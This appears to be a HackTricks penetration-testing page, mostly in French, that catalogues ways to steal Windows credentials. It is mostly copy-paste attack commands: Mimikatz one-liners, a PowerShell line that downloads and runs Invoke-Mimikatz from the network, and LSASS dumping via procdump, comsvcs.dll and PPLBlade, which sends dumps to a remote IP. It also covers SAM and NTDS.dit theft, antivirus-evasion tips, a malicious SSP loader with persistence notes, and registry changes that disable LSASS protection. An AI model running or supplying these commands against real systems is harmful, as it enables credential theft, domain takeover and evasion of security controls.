# Vol des Credentials Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Découvrez d'autres choses que Mimikatz peut faire dans** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains credentials.**

## Credentials with Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des passwords et des hashes** dans la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement d'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dump the lsass process**, **download the dump** et **extract** les **credentials locally** à partir du dump.

Vous pouvez aussi utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est réalisé automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz) : `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note** : Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe to dump lsass.exe**, cela vient du fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** nom lsass.exe.

### Dumping lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll** située dans `C:\Windows\System32` est responsable du dumping process memory en cas de plantage. Cette DLL inclut une **function** nommée **`MiniDumpW`**, conçue pour être invoquée via `rundll32.exe`.\
Il est sans importance d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. L'ID du processus à dumper constitue le premier composant, l'emplacement du fichier de dump représente le deuxième, et le troisième composant est strictement le mot **full**. Il n'existe aucune option alternative.\
Après analyse de ces trois composants, la DLL se charge de créer le fichier de dump et de transférer la mémoire du processus spécifié dans ce fichier.\
L'utilisation de la **comsvcs.dll** permet de dumper le processus lsass, supprimant ainsi le besoin d'uploader et d'exécuter procdump. Cette méthode est décrite en détail à [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

La commande suivante est utilisée pour l'exécution :
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Cliquez avec le bouton droit sur la barre des tâches et cliquez sur Task Manager
2. Cliquez sur More details
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processes
4. Cliquez avec le bouton droit sur le processus "Local Security Authority Process" et cliquez sur "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un Protected Process Dumper Tool qui permet d'obfusquer les memory dump et de les transférer vers des workstations distantes sans les déposer sur le disque.

**Fonctionnalités clés**:

1. Contournement de la protection PPL
2. Obfuscation des fichiers de memory dump pour échapper aux mécanismes de détection basés sur des signatures de Defender
3. Téléversement des memory dump via les méthodes RAW et SMB sans les déposer sur le disque (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:

1. **Stage 1 loader (`lals.exe`)** – searches `fdp.dll` for a placeholder consisting of 32 lower-case `d` characters, overwrites it with the absolute path to `rtu.txt`, saves the patched DLL as `nfdp.dll`, and calls `AddSecurityPackageA("nfdp","fdp")`. This forces **LSASS** to load the malicious DLL as a new Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – when LSASS loads `nfdp.dll`, the DLL reads `rtu.txt`, XORs each byte with `0x20`, and maps the decoded blob into memory before transferring execution.
3. **Stage 3 dumper** – the mapped payload re-implements MiniDump logic using **direct syscalls** resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). A dedicated export named `Tom` opens `%TEMP%\<pid>.ddt`, streams a compressed LSASS dump into the file, and closes the handle so exfiltration can happen later.

Notes pour l'opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll`, et `rtu.txt` dans le même répertoire. Stage 1 réécrit le placeholder codé en dur avec le chemin absolu vers `rtu.txt`, donc les séparer casse la chaîne.
* L'enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez définir cette valeur vous-même pour forcer LSASS à recharger le SSP à chaque démarrage.
* `%TEMP%\*.ddt` files are compressed dumps. Décompressez-les localement, puis fournissez-les à Mimikatz/Volatility pour l'extraction des credentials.
* L'exécution de `lals.exe` nécessite les droits admin/SeTcb pour que `AddSecurityPackageA` réussisse ; une fois l'appel terminé, LSASS charge de manière transparente le SSP malveillant et exécute Stage 2.
* Supprimer la DLL du disque ne l'évince pas de LSASS. Supprimez l'entrée de registre et redémarrez LSASS (reboot) ou laissez-la pour une persistance à long terme.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extraire le NTDS.dit du DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump de l'historique des mots de passe NTDS.dit depuis le DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de façon normale** car ils sont protégés.

### Depuis le registre

La façon la plus simple de voler ces fichiers est d'obtenir une copie depuis le registre:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extract the hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez copier des fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Using vssadmin

Le binaire vssadmin n'est disponible que dans les versions Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public), mais vous pouvez utiliser cela pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour copier SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Identifiants Active Directory - NTDS.dit**

Le **NTDS.dit** est connu comme le cœur de **Active Directory**, contenant des données cruciales sur les objets utilisateurs, les groupes et leurs appartenances. C'est là que sont stockés les **password hashes** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Data Table** : Cette table stocke les détails des objets tels que les utilisateurs et les groupes.
- **Link Table** : Elle garde la trace des relations, comme les appartenances aux groupes.
- **SD Table** : Les **security descriptors** pour chaque objet y sont conservés, assurant la sécurité et le contrôle d'accès des objets stockés.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Déchiffrement des hachages dans NTDS.dit

Le hachage est chiffré 3 fois :

1. Déchiffrer la Password Encryption Key (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Déchiffrer le **hash** en utilisant le **PEK** et **RC4**.
3. Déchiffrer le **hash** en utilisant **DES**.

Le **PEK** a la **même valeur** sur **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du **fichier SYSTEM** du contrôleur de domaine (il est différent entre les contrôleurs de domaine). C'est pourquoi, pour obtenir les identifiants depuis le fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copier NTDS.dit avec Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser l'astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) astuce).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur domain admin valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les fichiers **NTDS.dit volumineux**, il est recommandé de l'extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **metasploit module** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine depuis NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'intégralité des objets et de leurs attributs pour permettre une extraction d'informations supplémentaire une fois que le fichier brut NTDS.dit a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La ruche `SYSTEM` est optionnelle mais permet le déchiffrement des secrets (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, UAC flags, horodatage du dernier logon et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenances récursives, arbre et appartenance des unités organisationnelles, domaines de confiance avec le type de trusts, la direction et les attributs...

## Lazagne

Téléchargez le binaire depuis [here](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des credentials de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des credentials depuis le SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des credentials depuis la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Permet d'extraire des credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **exécutez-le** et les mots de passe seront extraits.

## Exploitation des sessions RDP inactives et affaiblissement des contrôles de sécurité

Le RAT FinalDraft d'Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :

### Collecte de télémétrie de type DumpRDPHistory

* **Cibles RDP sortantes** – parcourir chaque ruche utilisateur dans `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé contient le nom du serveur, `UsernameHint`, et l'horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Preuves RDP entrantes** – interroger le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les Event IDs **21** (connexion réussie) et **25** (déconnexion) afin de cartographier qui a administré la machine :

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) pendant que leur session **déconnectée** existe encore. CredSSP + NTLM fallback laisse leur vérificateur et leurs jetons dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou installer une persistance sur les contrôleurs de domaine.

### Rétrogradations du registre ciblées par FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Le paramètre `DisableRestrictedAdmin=1` force la réutilisation complète des credentials/tickets lors de RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des tokens UAC, de sorte que les local admins obtiennent des tokens non restreints sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter pendant que le DC est en ligne, offrant aux attaquants un autre compte intégré à hautes privilèges.
* `RunAsPPL=0` supprime les protections PPL de LSASS, rendant l'accès mémoire trivial pour les dumpers comme LalsDumper.

## Références

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
